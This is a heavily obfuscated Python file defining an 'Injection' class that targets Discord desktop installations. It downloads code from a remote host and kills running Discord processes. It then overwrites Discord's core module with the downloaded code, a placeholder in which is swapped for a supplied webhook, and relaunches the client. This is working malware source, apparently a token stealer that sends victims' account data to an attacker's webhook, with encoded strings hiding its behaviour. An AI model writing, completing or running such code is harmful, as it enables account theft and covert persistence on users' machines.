import os
import re
import subprocess
import psutil
import requests

class Injection:

    def __init__(self, webhook):
        𝘴𝙚𝘵𝗮𝘵𝘵𝘳(𝘴𝘦𝘭𝘧, 'appdata', 𝙤𝘴.getenv(__𝘪𝘮𝘱𝙤𝘳𝘁__('base64').b64decode(__𝘪𝙢𝘱𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x0bq\xb5t\t\x0c\xadp\nusr\r\x0c\x0br\x02\x00)\x05\x04\xd4')).decode()))
        𝘀𝗲𝘁𝘢𝙩𝘵𝘳(𝙨𝙚𝘭𝙛, 'discord_dirs', [𝘴𝙚𝘭𝘧.appdata + __𝗶𝗺𝗽𝗼𝙧𝘁__('base64').b64decode(__𝙞𝙢𝘱𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x8bp\r*H6\xf2+K\xce\r\xb4\x05\x00\x1a\x91\x04\x17')).decode(), 𝘀𝘦𝙡𝘧.appdata + __𝘪𝘮𝘱𝙤𝙧𝘵__('base64').b64decode(__𝘪𝙢𝙥𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x8bp\r*H6\xf2+K\xce\rr\x89\x0c7\xcdH\xce\xcb\xb6\x05\x00G\xea\x06\xe5')).decode(), 𝘀𝗲𝙡𝙛.appdata + __𝘪𝘮𝗽𝙤𝙧𝘁__('base64').b64decode(__𝗶𝘮𝘱𝗼𝗿𝘁__('zlib').decompress(b'x\xda\x8bp\r*H6\xf2+K\xce\r\n\x0cs\xf5\xb4\x05\x00.M\x05M')).decode(), 𝘀𝗲𝙡𝗳.appdata + __𝙞𝗺𝙥𝙤𝗿𝘵__('base64').b64decode(__𝙞𝗺𝙥𝙤𝗿𝙩__('zlib').decompress(b'x\xda\x8bp\r*H6\xf2+K\xce\rr\x8d\x8a\x88\xcaIr\xb7,O\n\x0f+Mq\xb4\xb5\x05\x00\x8c\xa1\t\x94')).decode()])
        𝙨𝗲𝙩𝙖𝙩𝘁𝙧(𝘴𝗲𝘭𝗳, 'code', 𝙧𝗲𝙦𝘂𝘦𝘴𝘁𝘀.get(__𝗶𝘮𝘱𝗼𝙧𝘵__('base64').b64decode(__𝘪𝗺𝗽𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x05\xc1;\x0e\x84 \x10\x00\xd0+)\xfbI(\xf7\x13\xa5\x00\x92\xa5`\x81\xce\x19\x0b\t\x83\x99B1\xee\xe9\xf7\xbdI\xb9\x0e\x95\xb9\xebS\x9e1\xe0\x9e\x04u\x93\xf2y\x0e\x96\xb0\xda\x06\xab#X?{\x14r\xd3b(i,\x87y?\x0e\xf3\x92\x04\xe1y\xc3\xea\x17\xc8=Ce\x8a\x17\xc7 \xae\r\xbe\x03C\x96-\xd6\xd4\xa3\xb0\xcb<\xfa\xa2+\xff\xfe\xe3$%v')).decode()).text)
        for 𝘱𝙧𝘰𝙘 in 𝙥𝙨𝘶𝘵𝗶𝗹.process_iter():
            if __𝘪𝙢𝗽𝘰𝘳𝘵__('base64').b64decode(__𝙞𝘮𝘱𝗼𝘳𝘁__('zlib').decompress(b'x\xda\x8br\xcf\xa9\x8a4\xb2\xac\x8cr\xb4\xb5\x05\x00\x1a\x8e\x03\xda')).decode() in 𝗽𝗿𝙤𝘤.name().lower():
                𝙥𝙧𝗼𝙘.kill()
        for 𝙙𝘪𝗿 in 𝘀𝗲𝘭𝗳.discord_dirs:
            if not 𝘰𝘀.path.exists(𝙙𝘪𝘳):
                continue
            if 𝘀𝘦𝗹𝘧.get_core(𝘥𝘪𝙧) is not None:
                with 𝗼𝙥𝘦𝘯(𝘴𝗲𝗹𝘧.get_core(𝘥𝘪𝗿)[𝘪𝘯𝘁.from_bytes(𝘮𝗮𝗽(lambda O, i: 256 - (𝗶𝗻𝘁(𝘖) + 𝘪), 𝙢𝘢𝘱(__𝙞𝘮𝗽𝘰𝙧𝘵__('base64').b64decode(__𝙞𝗺𝘱𝘰𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘇𝗶𝘱(*[𝗶𝘁𝘦𝘳(__𝗶𝗺𝙥𝗼𝙧𝘁__('base64').b64decode(__𝘪𝗺𝗽𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode())] * 3)), 𝘳𝗮𝘯𝘨𝙚(0)), __𝙞𝙢𝙥𝗼𝘳𝙩__('base64').b64decode(__𝘪𝘮𝗽𝙤𝙧𝙩__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] + __𝘪𝙢𝙥𝗼𝙧𝘵__('base64').b64decode(__𝘪𝘮𝗽𝘰𝗿𝙩__('zlib').decompress(b'x\xda\x8bp\xcf)\x8dr\x0f3\xf1\xc9-\xa8\x02\x00\x1b(\x04O')).decode(), __𝗶𝙢𝘱𝘰𝙧𝙩__('base64').b64decode(__𝘪𝙢𝙥𝘰𝙧𝘁__('zlib').decompress(b'x\xdaK)\xb7\xb5\x05\x00\x03\xb0\x01V')).decode(), encoding=__𝘪𝘮𝘱𝘰𝗿𝘁__('base64').b64decode(__𝙞𝙢𝘱𝘰𝗿𝘁__('zlib').decompress(b'x\xdaK\x89\x08\xca\xf5\tI\xb7\x05\x00\x0c\xd4\x02\xc0')).decode()) as 𝘧:
                    𝘧.write(𝙨𝙚𝗹𝗳.code.replace(__𝘪𝙢𝗽𝙤𝘳𝙩__('base64').b64decode(__𝘪𝘮𝘱𝘰𝘳𝙩__('zlib').decompress(b'x\xda\x8br\xcf\xa9\x8a4\xb2\xac\x8cr\xb3\xcc\x8e\x8a\xf0+Jq\xb7,\x8f0\xf2+K\xce\r-\xf1\r\xb4\xb5\x05\x00\xb4R\n\xd5')).decode(), 𝙨𝙚𝙡𝙛.get_core(𝗱𝘪𝗿)[𝗶𝙣𝘵.from_bytes(𝙢𝙖𝘱(lambda O, i: 287 - (𝙞𝗻𝘵(𝘖) + 𝙞), 𝙢𝘢𝙥(__𝙞𝙢𝙥𝘰𝗿𝘁__('base64').b64decode(__𝗶𝙢𝗽𝘰𝙧𝙩__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝙯𝙞𝗽(*[𝗶𝙩𝗲𝘳(__𝘪𝙢𝘱𝘰𝙧𝘵__('base64').b64decode(__𝗶𝙢𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xda\xf3\xcdJ7\x02\x00\x03v\x01Q')).decode())] * 3)), 𝗿𝙖𝘯𝙜𝙚(1)), __𝘪𝗺𝙥𝘰𝘳𝙩__('base64').b64decode(__𝙞𝙢𝘱𝗼𝙧𝘵__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)]).replace(__𝘪𝗺𝙥𝗼𝘳𝙩__('base64').b64decode(__𝗶𝙢𝘱𝗼𝗿𝘁__('zlib').decompress(b'x\xda\xf3\nKq\x0b\xcc\xce\x08\x081(\xce\x01\x00\x1a;\x04"')).decode(), 𝘄𝙚𝗯𝗵𝘰𝘰𝗸))
                    𝘀𝘦𝗹𝙛.start_discord(𝘥𝗶𝘳)

    def get_core(self, dir):
        for 𝘧𝗶𝙡𝘦 in 𝗼𝘀.listdir(𝘥𝙞𝘳):
            if 𝙧𝗲.search(__𝗶𝘮𝗽𝗼𝙧𝘁__('base64').b64decode(__𝗶𝙢𝘱𝙤𝙧𝘵__('zlib').decompress(b'x\xda\x8b\x8cp*\xf7\t.\xd6\x07\x00\x0cU\x02\xac')).decode(), 𝘧𝙞𝗹𝗲):
                𝗺𝘰𝘥𝘂𝗹𝙚𝘀 = 𝘥𝘪𝗿 + __𝗶𝙢𝗽𝘰𝗿𝘁__('base64').b64decode(__𝘪𝙢𝗽𝗼𝗿𝙩__('zlib').decompress(b'x\xda\x8bp\xb4\xb5\x05\x00\x02\xde\x01\x14')).decode() + 𝗳𝙞𝙡𝘦 + __𝘪𝙢𝙥𝗼𝙧𝘵__('base64').b64decode(__𝗶𝗺𝘱𝙤𝘳𝘁__('zlib').decompress(b'x\xda\x8bp7,\x8b\xf2\x08+\x8e\x8a\xf0\xb5\x05\x00\x19\x9b\x03\xee')).decode()
                if not 𝙤𝘀.path.exists(𝗺𝘰𝘥𝙪𝗹𝗲𝙨):
                    continue
                for 𝙛𝙞𝙡𝗲 in 𝗼𝘀.listdir(𝘮𝙤𝘥𝘶𝙡𝗲𝙨):
                    if 𝘳𝙚.search(__𝗶𝙢𝗽𝗼𝗿𝙩__('base64').b64decode(__𝙞𝗺𝗽𝗼𝘳𝙩__('zlib').decompress(b'x\xda\x8br\xcf\xa9\x8a4\xb2\xac\x8cr\xb3\xcc\x8e\x8a\xf0+Jq\xb7,\x8f0\xf2+K\xce\r-\xf1\xae\xb2\xb0\x05\x00\xb4\xbb\n\xf7')).decode(), 𝗳𝙞𝘭𝗲):
                        𝘤𝘰𝘳𝘦 = 𝗺𝗼𝘥𝘂𝙡𝘦𝘀 + __𝙞𝙢𝘱𝗼𝘳𝘵__('base64').b64decode(__𝙞𝘮𝗽𝗼𝙧𝘁__('zlib').decompress(b'x\xda\x8bp\xb4\xb5\x05\x00\x02\xde\x01\x14')).decode() + 𝙛𝙞𝗹𝙚 + __𝙞𝘮𝙥𝙤𝗿𝙩__('base64').b64decode(__𝗶𝗺𝘱𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x8bp\xb4\xb5\x05\x00\x02\xde\x01\x14')).decode() + __𝘪𝙢𝗽𝘰𝗿𝘵__('base64').b64decode(__𝗶𝙢𝙥𝙤𝙧𝙩__('zlib').decompress(b'x\xda\x8br\xcf\xa9\x8a4\xb2\xac\x8cr\xb3\xcc\x8e\x8a\xf0+Jq\xb7,\x8f0\xf2+K\xce\r\xb5\x05\x00\x8aI\t\x86')).decode()
                        if not 𝙤𝘀.path.exists(𝗰𝗼𝙧𝗲 + __𝙞𝘮𝘱𝙤𝘳𝘵__('base64').b64decode(__𝗶𝙢𝙥𝙤𝘳𝙩__('zlib').decompress(b'x\xda\x8bp\xcf)\x8dr\x0f3\xf1\xc9-\xa8\x02\x00\x1b(\x04O')).decode()):
                            continue
                        return (𝙘𝗼𝙧𝘦, 𝙛𝙞𝗹𝗲)

    def start_discord(self, dir):
        𝙪𝘱𝙙𝗮𝙩𝗲 = 𝘥𝗶𝗿 + __𝘪𝗺𝗽𝙤𝘳𝘁__('base64').b64decode(__𝙞𝙢𝙥𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x8bp\x0b+\x8frw3\x88\n6\xcdIu\x0f\xb5\x05\x00+\xd9\x05\x0f')).decode()
        𝘦𝘅𝘦𝗰𝘂𝘵𝘢𝘣𝙡𝗲 = 𝘥𝘪𝗿.split(__𝗶𝙢𝗽𝙤𝗿𝙩__('base64').b64decode(__𝙞𝗺𝗽𝘰𝙧𝘵__('zlib').decompress(b'x\xda\x8bp\xb4\xb5\x05\x00\x02\xde\x01\x14')).decode())[-𝙞𝗻𝙩.from_bytes(𝘮𝘢𝘱(lambda O, i: 866 - (𝙞𝙣𝘵(𝘖) + 𝘪), 𝗺𝘢𝙥(__𝙞𝘮𝙥𝙤𝘳𝘁__('base64').b64decode(__𝙞𝗺𝗽𝙤𝗿𝘁__('zlib').decompress(b'x\xda\x03\x00\x00\x00\x00\x01')).decode().join, 𝘻𝙞𝘱(*[𝘪𝙩𝙚𝗿(__𝗶𝘮𝘱𝙤𝙧𝘵__('base64').b64decode(__𝙞𝘮𝙥𝙤𝘳𝘵__('zlib').decompress(b'x\xda\xf3w\x894\x04\x00\x02\xef\x01\x1e')).decode())] * 3)), 𝙧𝙖𝗻𝙜𝗲(1)), __𝙞𝗺𝗽𝙤𝘳𝘁__('base64').b64decode(__𝙞𝗺𝙥𝘰𝘳𝘁__('zlib').decompress(b'x\xdaKr\xcf1Hq\xaf\xc8\x01\x00\x0cB\x02\xd5')).decode(), signed=False)] + __𝗶𝗺𝗽𝙤𝘳𝘁__('base64').b64decode(__𝙞𝘮𝘱𝘰𝙧𝘵__('zlib').decompress(b'x\xda\xf3\xc9\r3\x89\n\xb4\xb5\x05\x00\x0b}\x02i')).decode()
        for 𝙛𝗶𝙡𝗲 in 𝘰𝘀.listdir(𝗱𝙞𝗿):
            if 𝗿𝘦.search(__𝗶𝘮𝗽𝗼𝙧𝘵__('base64').b64decode(__𝗶𝙢𝘱𝗼𝗿𝘵__('zlib').decompress(b'x\xda\x8b\x8cp*\xf7\t.\xd6\x07\x00\x0cU\x02\xac')).decode(), 𝗳𝗶𝙡𝗲):
                𝗮𝙥𝗽 = 𝗱𝗶𝙧 + __𝗶𝘮𝗽𝘰𝙧𝘵__('base64').b64decode(__𝙞𝘮𝙥𝗼𝘳𝘵__('zlib').decompress(b'x\xda\x8bp\xb4\xb5\x05\x00\x02\xde\x01\x14')).decode() + 𝙛𝘪𝘭𝘦
                if 𝗼𝘀.path.exists(𝗮𝙥𝘱 + __𝘪𝘮𝙥𝘰𝙧𝙩__('base64').b64decode(__𝙞𝗺𝗽𝙤𝙧𝘁__('zlib').decompress(b'x\xda\x8bp\xb4\xb5\x05\x00\x02\xde\x01\x14')).decode() + __𝗶𝙢𝙥𝘰𝙧𝘁__('base64').b64decode(__𝘪𝙢𝗽𝙤𝗿𝘵__('zlib').decompress(b'x\xdaK\n\xb7\xccN\t\xaf\xc8I.\xb7\xb5\x05\x00\x1cs\x04Q')).decode()):
                    for 𝗳𝙞𝘭𝙚 in 𝘰𝙨.listdir(𝘢𝙥𝙥):
                        if 𝗳𝙞𝗹𝘦 == 𝙚𝘅𝙚𝘤𝘂𝘁𝘢𝘣𝙡𝙚:
                            𝗲𝘅𝙚𝘤𝘶𝙩𝘢𝙗𝙡𝗲 = 𝗮𝘱𝙥 + __𝙞𝙢𝙥𝗼𝘳𝙩__('base64').b64decode(__𝘪𝙢𝙥𝘰𝘳𝘵__('zlib').decompress(b'x\xda\x8bp\xb4\xb5\x05\x00\x02\xde\x01\x14')).decode() + 𝗲𝘹𝗲𝗰𝘶𝘵𝘢𝘣𝗹𝗲
                            𝘴𝘶𝘣𝘱𝘳𝗼𝙘𝙚𝘴𝘀.call([𝙪𝗽𝙙𝗮𝘵𝗲, __𝘪𝙢𝘱𝘰𝗿𝘵__('base64').b64decode(__𝘪𝘮𝗽𝗼𝙧𝘵__('zlib').decompress(b'x\xda\xf3\t6,O\xce\xb5\xcc\x8a\x8a\xf0\xab\n5\x0e\xcaH\xce\x0b\xb4\x05\x00G\xa5\x06\xd6')).decode(), 𝗲𝙭𝙚𝗰𝙪𝘁𝙖𝘣𝙡𝘦], shell=True, stdout=𝘀𝘶𝗯𝗽𝗿𝘰𝙘𝘦𝘀𝙨.PIPE, stderr=𝙨𝘂𝘣𝘱𝘳𝗼𝘤𝗲𝘀𝘴.PIPE)